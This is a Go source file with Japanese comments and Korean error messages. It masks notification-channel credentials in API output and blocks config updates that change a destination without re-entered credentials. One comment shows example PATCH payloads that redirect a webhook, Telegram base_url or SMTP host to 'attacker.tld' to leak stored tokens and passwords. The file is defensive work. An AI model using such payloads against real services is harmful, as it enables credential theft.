package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix はマスク値の目印となる接頭辞。API で認証情報を返すときは、この接頭辞付きの値で本当の内容を置き換え、
// 更新の API がこの接頭辞付きの値を受け取ったら「DB の元の値を変えない」と解釈する。
//
// 空文字列や固定の定数でなく接頭辞を使うのは、ついでに少しだけ見分けのつく情報を添えられるようにするため
// （MaskedValue を参照）。これでユーザーは鍵を貼り直さなくても「これはどのボットか」を見分けられる。
const MaskedPrefix = "__masked__"

// MaskedValue はマスク値を生成する：
//
//	"__masked__"              元の値が短すぎるので、何の手がかりも与えない
//	"__masked__:…ab12cd"      元の値の末尾6文字を見分けの手がかりとして添える
//
// 末尾6文字だけを見せるのは意図した選択：Webhook アドレスの見分けがつく情報は末尾にあり（WeCom の key、
// Feishu のボット id など）、先頭部分はボットによらず同じなので見分けの価値がない。末尾6文字では
// 認証情報は復元できないが、設定者が「自分のあのグループだ」と見分けるには十分だ。
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked はある値がマスク値か（つまり API が返したあと変更されていないか）を報告する。
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig は設定の写しを返し、そのチャネルの認証情報のフィールドをマスク値に置き換える。
//
// 不明なチャネルの種類では元の設定ではなく空の map を返す——チャネルの種類が識別できないときに
// 認証情報を含みうる元の内容を丸ごと返すくらいなら、UI に「設定は使えません」と表示させるほうがよい。
// 認証情報でないフィールドはそのまま残し、UI で正しく表示できるようにする。
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// headers のような入れ子の構造は全体を1つの認証情報として扱う：子キーを1つずつ判断するには、チャネルごとに
		// 「どの子キーが認証情報か」というルールをもう一組宣言する必要があり、複雑さが効果をはるかに上回る。
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials は「宛先が変わったのに、呼び出し側が
// 認証情報のフィールドについて態度を示していない」ことを表す。黙って通したり黙って認証情報を捨てたりせずにこれを返す理由は PrepareConfigUpdate を参照。
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // 変化した宛先のキー
	Missing []string // 明示的に態度を示していない認証情報のキー
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "대상 주소(" + strings.Join(e.Changed, ", ") + ")가 변경되었습니다. 자격 증명 필드(" +
		strings.Join(e.Missing, ", ") + ")를 함께 다시 입력하세요: 새 값을 넣거나, 비워 두어 더는 자격 증명이 필요 없음을 표시하세요. " +
		"기존 자격 증명은 이전 주소에만 유효하므로, 그대로 사용하면 새 주소에 넘겨주는 셈입니다."
}

// PrepareConfigUpdate はチャネル設定をマージし、「宛先の変更」というセキュリティ上機微な状況を処理する。
//
// チャネルの更新の経路で素の MergeConfig の代わりに使い、実際に通ることを確かめた次の経路を塞ぐ：
// 宛先（メッセージをどこへ送るか）と認証情報（どの身分で送るか）は独立した2組のフィールドで、MergeConfig は
// 「触れられていないキー」について一律に DB の元の値を残す。そのため、チャネルを PATCH できる人なら誰でも、**宛先だけ変えて
// 認証情報には触れなければ**、サーバーに DB の本物の認証情報を自分の管理するエンドポイントへ送らせられる：
//
//	webhook  {config:{url:"https://attacker.tld"}}  → 元の Authorization ヘッダーがリクエストとともに外へ送られる
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<本物のToken>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → STARTTLS のあとユーザー名とパスワードを渡してしまう
//
// この経路はまったく音を立てず、リダイレクトにも頼らない（そのためホストをまたぐ移動の拒否では止められない）。
// しかもこのパッケージのマスクの仕組みの目的——「認証情報をブラウザに返さない」——を正面から打ち破る。
//
// ルール：ある宛先のキーが新しい値に変えられたら、呼び出し側は**すべての**認証情報のキーについて明示的に態度を示さなければならない：
//   - 新しい値を渡す → 新しい値を使う
//   - 明示的に空文字列を渡す → そのフィールドにはもう認証情報が要らない（消去の意味を保つ）
//   - マスク値をそのまま返す / そのキーにまったく触れない → 拒否する
//
// 3つ目も拒否するのは、「マスク値」の意味がまさに「古い認証情報を引き継ぐ」ことであり、古い認証情報は
// 古い宛先に対してしか有効でないからだ。ここではわざと「認証情報を自動で捨てる」ことはしない——それは任意の認証情報のフィールド
// （webhook の headers、email の password）では、黙って「認証がなくなったのに API は 200 を返す」状態になり、
// エラーより調べにくい。操作する人にもう一度入力してもらうほうがよい。
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("등록되지 않은 채널 유형입니다: %q", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// 文字列でない認証情報の値（webhook の headers はオブジェクトなど）にマスクのリテラルが埋め込まれていたら、
	// 呼び出し側が「元の値を保つ」ための目印を構造体の内部に入れたということだ。MergeConfig は「文字列で
	// 接頭辞付き」のものしかマスクと認めないので、この形は普通のオブジェクトとしてそのまま保存される——DB に本当にリテラルの
	// "__masked__" が書き込まれ、以後の認証は黙って無効になり、何のエラーも出ない。拒否するほうがよい。
	//
	// この確認は必ず**最初**に置くこと：宛先が変わっていないときは早めに戻るので、後ろに置くと
	// 「宛先を変える」という1つの経路しか扱えなくなる（最初の版はまさにそう置き間違え、テストがすぐに捕まえた）。
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// 本当に変えられた宛先のキーを見つける。マスク値は「変えていない」のと同じ。
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// 宛先が変わっていないので、通常のマージを行う（マスク値は元の値を残し、空文字列は消去し、それ以外は上書き）。
		return MergeConfig(stored, incoming), nil
	}

	// 宛先が変わった：すべての認証情報のキーについて明示的に態度を示すことを求める。
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers は、マスクの目印を文字列でない構造に埋め込んで送ることを拒否する。
//
// マスクの仕組みの前提は「値全体が1つの文字列である」こと。webhook の headers のようなオブジェクトのフィールドは、
// 全体をマスクする（文字列 "__masked__" と書く）か、全体を送るかしかできない。目印をオブジェクトの内部に入れても
// 「変えない」ことは表せず、本物の値として DB に保存されてしまう。
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("%s 필드의 내용에 마스킹 표시(%q)가 들어 있습니다. 이 필드는 전체를 비워 두어 기존 값을 유지하거나 전체를 새 값으로 제출해야 하며, 구조체 내부에 마스킹 표시를 끼워 넣을 수 없습니다",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue は2つの設定値が同等かを比べる。JSON にシリアライズして比べるのは、ついでに
// 型の違いを処理するため——フロントエンドが送るポートは number で、DB から読み戻すと float64 なので、直接 == すると誤判定する。
//
// 「空」は比べる前に正規化しなければならない：この設定モデルでは空文字列と「キーが存在しない」は同じ状態である。
// MergeConfig は空文字列を明示的な消去とみなし、そのキーを delete するからだ。正規化しないと、
// ずっと空のままの任意の宛先フィールド（Telegram の base_url が唯一のそうしたフィールドで、空なら
// 公式のアドレスを使う）がこの経路を通ってしまう——
//
//	新規作成時に base_url:"" を保存  →  1回目の保存で MergeConfig がキーを削除
//	→ 2回目の保存では incoming は ""、stored にキーがなく、「宛先が変わった」と判定される
//	→ 認証情報はマスク値 → 400「宛先が変わりました。認証情報のフィールドも入力し直してください」
//
// 以後は保存するたびに失敗する。ユーザーは何も変えていないのに、Bot Token を貼り直さない限り直らない。
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue はある設定値が「空」かを判定する。
// 基準は MergeConfig の消去の判定（strings.TrimSpace(s) == ""）と一致させなければならない。
// さもないと「MergeConfig は削除すべきと考え、sameConfigValue は値があると考える」すき間が生じる。
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig は incoming を stored の上にマージし、チャネル設定の更新に使う。
//
// ルール：
//   - incoming で値がマスクのキー → stored の元の値を残す（ユーザーはこのフィールドを変えていない）
//   - incoming で値が空文字列のキー → 明示的な消去とみなし、そのキーを削除する
//   - それ以外のキー → incoming の値で上書きする
//   - stored にあって incoming にないキー → 残す（部分更新の意味）
//
// 空文字列を「消去」とみなすかははっきりさせておく必要がある：フロントエンドのフォームは入力していないフィールドを空文字列で送るので、
// それを有効な値として書き込むと、「空のままにして元の値を残す」つもりのフィールドが本当に消えてしまう。
// ここでは明示的な消去を選ぶ。誤って設定したフィールドを消したいとき、ユーザーには他に表す方法がないからだ
// （フィールドを外せば「渡していない」と「空の値を渡した」を区別できるが、UI ではその区別を使わない）。
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // マスク値 = 変更なし。stored を残す
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
